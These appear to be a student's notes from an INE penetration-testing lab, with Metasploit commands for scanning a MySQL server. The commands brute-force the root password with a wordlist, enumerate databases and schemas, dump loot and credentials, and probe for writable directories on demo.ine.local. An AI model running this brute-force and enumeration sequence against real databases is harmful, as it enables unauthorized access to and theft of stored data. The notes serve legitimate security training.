![Pasted image 20250916203336.png](attachments/Pasted%20image%2020250916203336.png)

```
└─# service postgresql start
└─# msfconsole 
msf6 > workspace -a MySQL_ENUM
msf6 > setg RHOSTS demo.ine.local
msf6 > setg RHOST demo.ine.local

# TO GET VERSION OF MYSQL
msf6 > search type:auxiliary name:mysql
msf6 > use auxiliary/scanner/mysql/mysql_version
msf6 auxiliary(scanner/mysql/mysql_version) > show options 

# TO IDENTIFY THE CORRECT PORT MYSQL IS RUNNING ON
msf6 auxiliary(scanner/mysql/mysql_version) > search portscan
msf6 auxiliary(scanner/mysql/mysql_version) > use auxiliary/scanner/portscan/tcp 
msf6 auxiliary(scanner/portscan/tcp) > show options 
msf6 auxiliary(scanner/portscan/tcp) > run

msf6 auxiliary(scanner/portscan/tcp) > use auxiliary/scanner/mysql/mysql_version
msf6 auxiliary(scanner/mysql/mysql_version) > show options
msf6 auxiliary(scanner/mysql/mysql_version) > run

# TO NOW LOGIN TO MYSQL SERVER
msf6 auxiliary(scanner/mysql/mysql_version) > run
msf6 auxiliary(scanner/mysql/mysql_version) > use auxiliary/scanner/mysql/mysql_login
msf6 auxiliary(scanner/mysql/mysql_login) > show options 
msf6 auxiliary(scanner/mysql/mysql_login) > set USERNAME root
# since mysql is run by admin
msf6 auxiliary(scanner/mysql/mysql_login) > set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf6 auxiliary(scanner/mysql/mysql_login) > run

# ENUMERATION OF MYSQL DATABSE
msf6 auxiliary(scanner/mysql/mysql_login) > search mysql_enum
msf6 auxiliary(scanner/mysql/mysql_login) > use auxiliary/admin/mysql/mysql_enum
msf6 auxiliary(admin/mysql/mysql_enum) > show options 
msf6 auxiliary(admin/mysql/mysql_enum) > set PASSWORD twinkle
msf6 auxiliary(admin/mysql/mysql_enum) > set USERNAME root


# INTERACT WITH SQL DATABASE
msf6 auxiliary(admin/mysql/mysql_enum) > search mysql_sql
msf6 auxiliary(admin/mysql/mysql_enum) > use auxiliary/admin/mysql/mysql_sql 
msf6 auxiliary(admin/mysql/mysql_sql) > show options 
msf6 auxiliary(admin/mysql/mysql_sql) > set PASSWORD twinkle
msf6 auxiliary(admin/mysql/mysql_sql) > set USERNAME root
msf6 auxiliary(admin/mysql/mysql_sql) > set SQL 5.5.61
msf6 auxiliary(admin/mysql/mysql_sql) > run
# set SQL query to run in database (options)
msf6 auxiliary(admin/mysql/mysql_sql) > set SQL show databases;
msf6 auxiliary(admin/mysql/mysql_sql) > set SQL use videos;
msf6 auxiliary(admin/mysql/mysql_sql) > run

# TO DISPLAY TABLES UNDER DATABASES
msf6 auxiliary(admin/mysql/mysql_sql) > search mysql_schema
msf6 auxiliary(admin/mysql/mysql_sql) > use auxiliary/scanner/mysql/mysql_schemadump
msf6 auxiliary(scanner/mysql/mysql_schemadump) > show options 
msf6 auxiliary(scanner/mysql/mysql_schemadump) > set PASSWORD twinkle
msf6 auxiliary(scanner/mysql/mysql_schemadump) > set USERNAME root
msf6 auxiliary(scanner/mysql/mysql_schemadump) > run
msf6 auxiliary(scanner/mysql/mysql_schemadump) > hosts
sf6 auxiliary(scanner/mysql/mysql_schemadump) > services
msf6 auxiliary(scanner/mysql/mysql_schemadump) > loot
msf6 auxiliary(scanner/mysql/mysql_schemadump) > creds
msf6 auxiliary(scanner/mysql/mysql_schemadump) > exit


# TO LOGIN INTO MYSQL DATABASE REMOTELY
└─# mysql -h demo.ine.local -u root -p
Enter password: 
MySQL [(none)]> show databases;
MySQL [(none)]> use videos;
MySQL [videos]> show tables;
MySQL [videos]> exit
```


Run the **auxiliary/scanner/mysql/mysql_writable_dirs** module.

**Commands:**

```
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS demo.ine.local
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

![Content Image](https://assets.ine.com/lab/learningpath/7bcbfa099222dca93f6d605df2f25df2e84c3b18708ba78736779011861fa4e4.jpg)
